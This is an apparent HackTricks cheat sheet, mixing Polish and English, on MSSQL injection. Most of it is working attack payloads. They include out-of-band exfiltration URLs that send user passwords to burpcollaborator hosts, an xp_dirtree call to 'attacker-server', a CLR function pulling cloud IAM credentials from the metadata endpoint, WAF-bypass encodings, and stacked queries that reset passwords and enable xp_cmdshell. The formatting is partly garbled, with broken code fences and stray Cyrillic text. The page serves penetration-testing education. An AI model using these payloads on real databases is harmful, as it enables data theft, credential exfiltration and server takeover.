# MSSQL Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Enumeracja Active Directory

Mo≈ºliwe jest **enumerowanie u≈ºytkownik√≥w domeny za pomocƒÖ SQL injection wewnƒÖtrz serwera MSSQL** przy u≈ºyciu nastƒôpujƒÖcych funkcji MSSQL:

* **`SELECT DEFAULT_DOMAIN()`**: Pobierz nazwƒô bie≈ºƒÖcej domeny.
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: Je≈õli znasz nazwƒô domeny (_DOMAIN_ w tym przyk≈Çadzie), ta funkcja zwr√≥ci **SID u≈ºytkownika Administratora** w formacie szesnastkowym. Bƒôdzie to wyglƒÖdaƒá jak `0x01050000000[...]0000f401`, zwr√≥ƒá uwagƒô, ≈ºe **ostatnie 4 bajty** to liczba **500** w formacie **big endian**, co jest **wsp√≥lnym ID u≈ºytkownika administratora**.\
Ta funkcja pozwoli Ci **poznaƒá ID domeny** (wszystkie bajty opr√≥cz ostatnich 4).
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : Ta funkcja zwr√≥ci **nazwƒô u≈ºytkownika wskazanego ID** (je≈õli istnieje), w tym przypadku **0000e803** w big endian == **1000** (zwykle jest to ID pierwszego utworzonego regularnego u≈ºytkownika). Mo≈ºesz sobie wyobraziƒá, ≈ºe mo≈ºesz przeprowadziƒá brute-force ID u≈ºytkownik√≥w od 1000 do 2000 i prawdopodobnie uzyskaƒá wszystkie nazwy u≈ºytkownik√≥w domeny. Na przyk≈Çad u≈ºywajƒÖc funkcji takiej jak poni≈ºsza:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **Alternatywne wektory oparte na b≈Çƒôdach**

B≈Çƒôdy oparte na SQL injection zazwyczaj przypominajƒÖ konstrukcje takie jak `+AND+1=@@version--` oraz warianty oparte na operatorze ¬´OR¬ª. Zapytania zawierajƒÖce takie wyra≈ºenia sƒÖ zazwyczaj blokowane przez WAF. Jako obej≈õcie, po≈ÇƒÖcz ciƒÖg za pomocƒÖ znaku %2b z wynikiem okre≈õlonych wywo≈Ça≈Ñ funkcji, kt√≥re wywo≈ÇujƒÖ b≈ÇƒÖd konwersji typu danych na poszukiwanych danych.

Niekt√≥re przyk≈Çady takich funkcji:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

Przyk≈Çad u≈ºycia funkcji `USER_NAME()`:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

Te sztuczki SSRF [zosta≈Çy wziƒôte stƒÖd](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

### `fn_xe_file_target_read_file`

Wymaga uprawnienia **`VIEW SERVER STATE`** na serwerze.
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

Wymaga uprawnienia **`CONTROL SERVER`**.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

Wymaga uprawnienia **`CONTROL SERVER`**.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

Procedury sk≈Çadowane, takie jak `xp_dirtree`, choƒá nieudokumentowane oficjalnie przez Microsoft, zosta≈Çy opisane przez innych w Internecie z powodu ich u≈ºyteczno≈õci w operacjach sieciowych w MSSQL. Procedury te sƒÖ czƒôsto wykorzystywane w exfiltracji danych Out of Band, co zosta≈Ço pokazane w r√≥≈ºnych [przyk≈Çadach](https://www.notsosecure.com/oob-exploitation-cheatsheet/) i [postach](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/).

Procedura sk≈Çadowana `xp_dirtree`, na przyk≈Çad, jest u≈ºywana do wykonywania ≈ºƒÖda≈Ñ sieciowych, ale jest ograniczona tylko do portu TCP 445. Numer portu nie jest modyfikowalny, ale pozwala na odczyt z udzia≈Ç√≥w sieciowych. U≈ºycie jest pokazane w poni≈ºszym skrypcie SQL:
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```
Warto zauwa≈ºyƒá, ≈ºe ta metoda mo≈ºe nie dzia≈Çaƒá na wszystkich konfiguracjach systemu, takich jak `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` dzia≈ÇajƒÖcy na `Windows Server 2016 Datacenter` z ustawieniami domy≈õlnymi.

Dodatkowo istniejƒÖ alternatywne procedury sk≈Çadowane, takie jak `master..xp_fileexist` i `xp_subdirs`, kt√≥re mogƒÖ osiƒÖgnƒÖƒá podobne wyniki. Dalsze szczeg√≥≈Çy dotyczƒÖce `xp_fileexist` mo≈ºna znale≈∫ƒá w tym [artykule TechNet](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx).

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

Oczywi≈õcie mo≈ºna r√≥wnie≈º u≈ºyƒá **`xp_cmdshell`** do **wykonania** czego≈õ, co wywo≈Çuje **SSRF**. Aby uzyskaƒá wiƒôcej informacji, **przeczytaj odpowiedniƒÖ sekcjƒô** na stronie:

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL User Defined Function - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Tworzenie CLR UDF (Common Language Runtime User Defined Function), czyli kodu napisanego w dowolnym jƒôzyku .NET i skompilowanego do DLL, kt√≥ry ma byƒá za≈Çadowany w MSSQL w celu wykonywania niestandardowych funkcji, to proces, kt√≥ry wymaga dostƒôpu `dbo`. Oznacza to, ≈ºe zazwyczaj jest to wykonalne tylko wtedy, gdy po≈ÇƒÖczenie z bazƒÖ danych jest nawiƒÖzywane jako `sa` lub z rolƒÖ Administratora.

Projekt Visual Studio oraz instrukcje instalacji sƒÖ dostƒôpne w [tym repozytorium Github](https://github.com/infiniteloopltd/SQLHttp), aby u≈Çatwiƒá za≈Çadowanie binarnego pliku do MSSQL jako zestawu CLR, co umo≈ºliwia wykonywanie ≈ºƒÖda≈Ñ HTTP GET z poziomu MSSQL.

Rdze≈Ñ tej funkcjonalno≈õci jest zawarty w pliku `http.cs`, kt√≥ry wykorzystuje klasƒô `WebClient` do wykonania ≈ºƒÖdania GET i pobrania tre≈õci, jak pokazano poni≈ºej:
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
```
Przed wykonaniem polecenia SQL `CREATE ASSEMBLY`, zaleca siƒô uruchomienie nastƒôpujƒÖcego fragmentu SQL, aby dodaƒá hash SHA512 zestawu do listy zaufanych zestaw√≥w serwera (widocznej za pomocƒÖ `select * from sys.trusted_assemblies;`):
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
Po pomy≈õlnym dodaniu zestawu i utworzeniu funkcji, poni≈ºszy kod SQL mo≈ºe byƒá wykorzystany do wykonywania ≈ºƒÖda≈Ñ HTTP:
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
### **Szybka Eksploatacja: Pobieranie Ca≈Çej Zawarto≈õci Tabeli w Jednym Zapytaniu**

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

Kr√≥tkƒÖ metodƒÖ na wyodrƒôbnienie pe≈Çnej zawarto≈õci tabeli w jednym zapytaniu jest wykorzystanie klauzuli `FOR JSON`. To podej≈õcie jest bardziej zwiƒôz≈Çe ni≈º u≈ºycie klauzuli `FOR XML`, kt√≥ra wymaga okre≈õlonego trybu, takiego jak "raw". Klauzula `FOR JSON` jest preferowana ze wzglƒôdu na swojƒÖ zwiƒôz≈Ço≈õƒá.

Oto jak pobraƒá schemat, tabele i kolumny z bie≈ºƒÖcej bazy danych:
```sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
```markdown
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
```

### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
```markdown
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
```

To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```

## **Little tricks for WAF bypasses**

[Tricks also from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

Non-standard whitespace characters: %C2%85 –∏–ª–∏ %C2%A0:

```
```markdown
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```

A period instead of a whitespace between FROM and a column name:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```

\N separator between SELECT and a throwaway column:

```
```markdown
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
SELECT 'a' SELECT 'b'
```

So for example, multiple queries such as:

```sql
use [tempdb]  
create table [test] ([id] int)  
insert [test] values(1)  
select [id] from [test]  
drop table[test]
```

Can be reduced to:

```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# Dodanie bezu≈ºytecznego exec() na ko≈Ñcu i sprawienie, by WAF my≈õla≈Ç, ≈ºe to nie jest wa≈ºne zapytanie
admina'union select 1,'admin','testtest123'exec('select 1')--
## To bƒôdzie:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# U≈ºywanie dziwnie zbudowanych zapyta≈Ñ
admin'exec('update[users]set[password]=''a''')--
## To bƒôdzie:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Lub w≈ÇƒÖczenie xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## To bƒôdzie
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

## References

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
